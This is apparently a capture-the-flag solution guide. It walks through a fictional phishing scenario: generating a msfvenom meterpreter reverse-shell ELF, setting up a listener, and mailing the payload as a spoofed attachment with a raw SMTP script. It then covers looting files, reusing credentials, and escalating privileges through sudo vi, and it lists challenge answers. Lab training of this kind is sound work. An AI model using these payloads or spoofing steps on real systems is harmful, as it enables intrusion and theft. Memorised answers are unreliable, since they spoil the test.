# Report Back

_Solution Guide_

## Overview

This solution guide covers how to read the provided shipment report to find out possible suspects, how to craft a malicious payload and use it as a phishing email attachment to obtain remote access to the careless employee's system and then, how to navigate through the exploited system to find the flags.  

All answers for this challenge are generated dynamically. The format for the answer of **question 1** will be the username of the insider's threat system and it will have the following format: `user-abc123`. The answer to **question 2 - 7** will be a random 8 character hexadecimal. Here is an example of a possible answer: `39e0a53e`.

>To understand this solution guide better, you need moderate knowledge of the following software/skills: Telnet, SMTP and IMAP, Scripting, Msfvenom and Metasploit.


## Question 1 

*What is the username of the employee responsible?* 

### Using telnet to view your email

In order to view your email using telnet, you can type the following commands in your terminal. 

1. Let's start by logging in:

```
telnet 10.5.5.96 imap

## The purpose of putting a unique word/number before each command is to allow you to asociate each response with the corresponding command issued. 

00 LOGIN human@merchant.caste.aurellia tartans
```

2. Now that you are logged in, type the following command to see your email folders: 

```
01 LIST “” “*”
```

3. Next, you can decide to which folder to navigate. If you want to know how much mail you have you can type the following command: 
```
02 EXAMINE INBOX
```

Let's go to you INBOX with the following command: 
```
03 SELECT INBOX
```

4. That command will show you how many emails you have, how many are new, how many have you seen, alongside other useful information. In your case, you will already have two unseen emails.

![Image 1](./img/img_1.png)

5. Finally, let's choose the first email we received by typing the following: 
```
## This command will show you the complete email including: headers, subject, body, from, to, and more. 

04 FETCH 1 BODY[]
```
![Image 2](./img/img_2.png)

6. The first email lets you now your main goal of your first task and also, let's you know that the second email you have is going to be a Shipment Report that you need to use in order to accomplish your first task. Let's see that report. 

### Reading the Shipment Report

1. To read the second email, just type the following: 
```
05 FETCH 2 BODY[]
```

2. You will get a huge list and, if you look at the email headers, it will let you know it is a `.csv` file. It would be easier to read this file using LibreOffice Calc. In this example, we just copy and pasted the list to a new file and saved it as a `.csv` file on our Desktop since it would be faster than creating a script to download it from telnet or any other similar approach.


3. Once you open the file, you will see something similar to the following image: 

![Image 3](./img/img_3.png)

### Analyzing Shipment Report

1. Based on the first email we read, we need to figure out as who to masquerade to see which employee would download our malicious attachment (to be developed further in the solution guide).

2. We can start by adding filter to our first row of the `ShipmentReport.csv`. Do that by first, clicking on the first column (Just click the number `1` at the top left of the sheet). Then, go to the `Data` tab and then, click on `AutoFilter`. That should allow you to filter columns. 

3. We know that the output of that employee downloading and executing malicious attachments is that route IDs get intercepted by Space Pirates, hence, shipments are getting lost. Let's filter the shipment status by just the `Lost` ones.

4. The output looks suprising. In our case, every package in which `remy@merchant.caste.aurellia` is the Point of Contact have been lost. Also, Vyla's Manager have always been the same, `dilreia@merchant.caste.aurellia`. Your output might different. 

![Image 4](./img/img_4.png)

5. Let's try sending `remy@merchant.caste.aurellia` a malicious email masquerading as `dilreia@merchant.caste.aurellia` and see what we get. 

### Preparing malicious attachment

1. Since the first email told you your main goal is to obtain remote access, let's use msfvenom to create a binary that allows us to obtain remote access. 

2. Start by typing the following command: 

```
ip a
```
3. Make sure to write your ip down since you will use it in the next command. In our case, it was `10.5.5.143`. Yours might be different. 

4. Next, let's create the binary: 

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.5.5.143 LPORT=4444 -f elf > malicious.elf
```

5. Let's break this down to understand what we just did. 

First, we called msfvenom. Then, we used parameter `-p` which allows us to specify which payload to use. Now, the payload we chose was `linux/x64/meterpreter/reverse_tcp` and the reason for this is that, our first email notified us that all employees use Linux. The rest of the payload, is us choosing a staged payload with meterpreter, which will make it easier once we gain a session. `LHOST` just means `local host`, so here you would enter the ip you wrote down before. `LPORT` is just a random port (usually 4444 by default) were we will be listening once the user executes our malicious attachment. Finally, `-f elf` allows you to specify which type of file we want. Usually, for Windows is `.exe` and for Linux `.elf`. And then, any name you want the file to have. 

6. We are now ready to start listening. 

### Preparing msfconsole

1. Now that we have the malicious file ready, we can configure msfconsole to listen on port 4444 to see when someone clicks our attachment. Follow the next commands to configure it. First, run msfconsole. 

``` 
msfconsole
```
2. Now, let's use `multi/handler` since it a very popular listener and will work great with our binary.
```
use multi/handler
```

3. Then, select which payload to use. This should be the exact same as your attachment payload. 
```
set payload linux/x64/meterpreter/reverse_tcp
```

4. You can now see the options to make sure how to configure `multi/handler` properly
```
show options
```

5. Here you will notice that you only need your local host and local port. Both of these should be the same as the ones used when creating the malicious file. 
```
set LHOST 10.5.5.143
set LPORT 4444
```
6. Finally, you can write the following to start listening.
```
run
```

![Image 4](./img/img_5.png)

### Sending the malicious attachment

1. Ever since you started the challenge, you might be thinking, how will I send an attachment using telnet? Well, it certainly adds a few more steps but, nothing a quick script can't do. 

2. First of all, to send attachments via telnet, you need to encode the attachments to base 64 and then, also add some headers. Here is an example of an easy script that will do all of this for you: 

```
#!/bin/bash

filename="malicious.elf"
subject="Subject of your email"
txtmessage="Body of your email"
FROM="dilreia@merchant.caste.aurellia"
TO="remy@merchant.caste.aurellia" 


{
sleep 1;
echo "MAIL FROM:<$FROM>"
sleep 1;
echo "RCPT TO: $TO"
sleep 1;
echo "DATA"
sleep 1;
echo "Subject:" $subject
sleep 1;
echo "MIME-Version: 1.0"
sleep 1;
echo "Content-Type: multipart/mixed; boundary="RaNDoMString123__AA_ABCdefghij""
sleep 1;
echo ""
sleep 1;
echo "--RaNDoMString123__AA_ABCdefghij"
sleep 1;
echo "Content-Type: text/plain; charset=iso-8859-1"
sleep 1;
echo "Content-Transfer-Encoding: 8bit"
sleep 1;
echo ""
sleep 1;
echo $txtmessage
sleep 1;
echo ""
sleep 1;
echo ""
sleep 1;
echo "--RaNDoMString123__AA_ABCdefghij"
sleep 1;
echo "Content-Type: application/octet-stream; name="$filename""
sleep 1;
echo "Content-Transfer-Encoding: base64"
sleep 1;
echo "Content-Disposition: attachment; filename="$filename";"
sleep 1;
echo ""
sleep 1;
cat $filename | base64;
sleep 1;
echo ""
sleep 1;
echo ""
sleep 1;
echo "--RaNDoMString123__AA_ABCdefghij--"
sleep 1;
echo ""
sleep 1;
echo "."
sleep 1;
echo "quit"
} | telnet 10.5.5.96 25
```

3. Save it and don't forget to give it the proper permissions. We chose to save it on our Desktop and call it `sendmail.sh`. To give proper permissions, type the following: 
```
chmod +x sendmail.sh
```

4. Now, we are ready to execute. 
```
/home/human/Desktop/sendmail.sh
```

5. Once your script finishes running, go to your msfconsole multi/handler window that you had running and you should see that you now have a meterpreter session! Let's type the following command to retrieve the machine's username: 
```
getuid
```

![Image 6](./img/img_6.png)

6. In our case, this gave us `remy-4a97e6`. This is the answer to question 1. Time to send this username to `admin@merchant.caste.aurellia` and see what our next task is. Do not close your meterpreter session, since it will be useful later. We can modify our script to send emails easier now. Here is a short modification:

```
#!/bin/bash

subject="Subject of your email"
txtmessage="remy-4a97e6"
FROM="human@merchant.caste.aurellia"
TO="admin@merchant.caste.aurellia" 


{
sleep 1;
echo "MAIL FROM:<$FROM>"
sleep 1;
echo "RCPT TO: $TO"
sleep 1;
echo "DATA"
sleep 1;
echo "Subject:" $subject
sleep 1;
echo "MIME-Version: 1.0"
sleep 1;
echo "Content-Type: multipart/mixed; boundary="RaNDoMString123__AA_ABCdefghij""
sleep 1;
echo ""
sleep 1;
echo "--RaNDoMString123__AA_ABCdefghij"
sleep 1;
echo "Content-Type: text/plain; charset=iso-8859-1"
sleep 1;
echo "Content-Transfer-Encoding: 8bit"
sleep 1;
echo ""
sleep 1;
echo $txtmessage
sleep 1;
echo ""
sleep 1;
echo "."
sleep 1;
echo "quit"
} | telnet 10.5.5.96 25
```

7. Notice that we changed many of the variables found at the top of the script. Save it and execute the script again. 
```
/home/human/Desktop/sendmail.sh
```

8. Once you send the username (`remy-4a97e6`) to `admin@merchant.caste.aurellia`, you will receive an email explaining you your next task and providing you `remy's` credentials. Your next task is finding route IDs and sending them to the admin. 


![Image 9](./img/img_9.png)

![Image 10](./img/img_10.png)

## Question 2

*Token-1 (received via email from admin@merchant.caste.aurellia)*

### Finding our first route ID

1. Since we already have open session on msfconsole, we can use that one to look in common places we can find downloaded artifacts. 

2. On the meterpreter session, type the following to navigate to the Downloads folder: 
```
cd Downloads/
```
3. Then, type the following to see what is on the Downloads directory: 
```
ls
```
4. You will notice that `remy` indeed downloaded your malicious file, and also, you will find a document called `TradingRoute.pdf`. Meterpreter allows us to download artifacts to our own directory with the following command: 
```
download TradingRoute.pdf
```

5. In our case, we opened our meterpreter session from our Desktop, so the `TradingRoute.pdf` will be there. We can go ahead an open it and we will see a confidential document and our first route ID: `dd82a1`.

![Image 7](./img/img_7.png)
![Image 37](./img/img_37.png)

6. Our next step is sending this route id to `admin@merchant.caste.aurellia` and then we will receive a flag. You can use the same script we used earlier, just dilreiamber to change the body of the email (`txtmessage` variable, in our case) to the route ID you found. 

7. We can go ahead and use telnet again to view our Inbox. 

![Image 11](./img/img_11.png)

8. We got out first flag: `026d196756b2047b`!

![Image 12](./img/img_12.png)

## Question 3

*Token-2 (received via email from admin@merchant.caste.aurellia)*

### Finding our second route ID

1. Since we still have an open meterpreter session, let's try going to the Documents directory and see what we can find. 
```
cd Documents/
```

2. Here, you will see another document called `TradingRoute2.pdf`. Proceed to download it and open it the same way as before. 
```
download TradingRoute2.pdf
```

![Image 8](./img/img_8.png)

![Image 38](./img/img_38.png)


3. Once you open the pdf, you will see your route ID. In our case it was: `4da6fd`.

4. Proceed using the same script to send another email to the admin with your new route ID. dilreiamber to change the `txtmessage` variable. 

5. Once we check our INBOX, we received another email with our second flag: `ccf3b2c7ac53109e`.

![Image 13](./img/img_13.png)

![Image 14](./img/img_14.png)

## Question 4

*Token-3 (received via email from admin@merchant.caste.aurellia)*

### Finding our third route ID

1. Remember that the admin sent us `remy's ` credentials. Let's try logging in to remy's email using its credentials and see what we can find!
```
telnet 10.5.5.96 imap
00 LOGIN remy@merchant.caste.aurellia 5d37b2
01 LIST "" "*"
```

![Image 16](./img/img_16.png)


2. The `EXAMINE` command allows us to view how many emails `remy` has on each mailbox. Here is the syntax of that command: 
```
02 EXAMINE INBOX
03 EXAMINE Sent
```

![Image 17](./img/img_17.png)

![Image 18](./img/img_18.png)

It looks like `remy` has 17 email in the INBOX and 21 emails in the `Sent` mailbox. Let's take a look at those emails to see what we can find.

3. Let's first take a look at the INBOX mailbox. 
```
04 SELECT INBOX
```

![Image 19](./img/img_19.png)

4. After a few `FETCH` commands, it looks like email number 5 gave us another route ID! Great!

```
05 FETCH 5 BODY[]
```

![Image 20](./img/img_20.png)

5. A few emails later, on email 11, we also find the following email, which might help us later on. 
```
06 FETCH 11 BODY[]
```

![Image 21](./img/img_21.png)

6. Let's send the new route ID via email to admin and receive our third flag: `e7aa5219a2b4a62e`.

![Image 29](./img/img_29.png)

![Image 30](./img/img_30.png)


## Question 5

*Token-4 (received via email from admin@merchant.caste.aurellia)*

### Finding our fourth route ID

1. After going through all the emails on the `INBOX`, you'll notice there aren't any other route IDs in that INBOX. Let's move to the `Sent` mailbox and see what we can find. 

```
07 SELECT Sent
```
![Image 22](./img/img_22.png)

2. Once we selected the `Sent` folder, we can start fetching emails to look for Route IDs. 

3. After a few `FETCH` commands, we find a route ID on email 11. 

```
08 FETCH 11 BODY[]
```

![Image 23](./img/img_23.png)

4. We proceed with sending this route ID to the admin to get out fourth flag!

![Image 31](./img/img_31.png)
![Image 32](./img/img_32.png)


## Question 6

*Token-5 (received via email from admin@merchant.caste.aurellia)*

### Finding our fifth route ID

1. For this flag, we are going to use `remy's` credentials to ssh into his machine this time. But, first we can take advantage of the open meterpreter session and retrieve `remy's` ip address. 

```
shell
ip a
```

![Image 24](./img/img_24.png)

2. Now that you have the ip, we can go ahead an ssh. Remember to use the password the admin gave you. In our case, it was: `5d37b2`.
```
ssh remy-4a97e6@192.168.0.10
```

![Image 25](./img/img_25.png)

3. Once you login, if you try to sudo, you will realize you can't. If you perform the following command, you will be able to see what commands can `remy` perform as sudo. 
```
sudo -l
```
![Image 26](./img/img_26.png)

4. Based on that output, it seems that `remy` can perform `vi` as sudo. Find a way to use this to yout advantage and perform privilege escalation. Here is how we did it: 

```
sudo vi
:!/bin/bash
```

5. This got us privilege escalation! Let's move to the root directory to find our next route id. 
```
cd /root/
ls
cat TradingRoute5.txt
```

![Image 27](./img/img_27.png)

6. There we go. Route ID: `39893e` found. 

7. Send it to admin to retrieve Flag number 5: `3da7e77256d8e542`. 

![Image 33](./img/img_33.png)
![Image 34](./img/img_34.png)


## Question 7

*Token-6 (received via email from admin@merchant.caste.aurellia)*

### Finding our sixth route ID

1. For the last route ID, rememebr we found an email that talked about the document `TradingRoute5.txt`. It told us it used Extended Attribute to hide something. Let's check that out from our ssh connection. 

```
getfattr TradingRoute5.txt
getfattr -n user.comment TradingRoute5.txt
```

![Image 28](./img/img_28.png)

2. That wasn't so hard! There's our last route ID. Let's send it to the admin and get out last flag. In our case, it was: `66a981f6c767b1ad`.

![Image 35](./img/img_35.png)
![Image 36](./img/img_36.png)
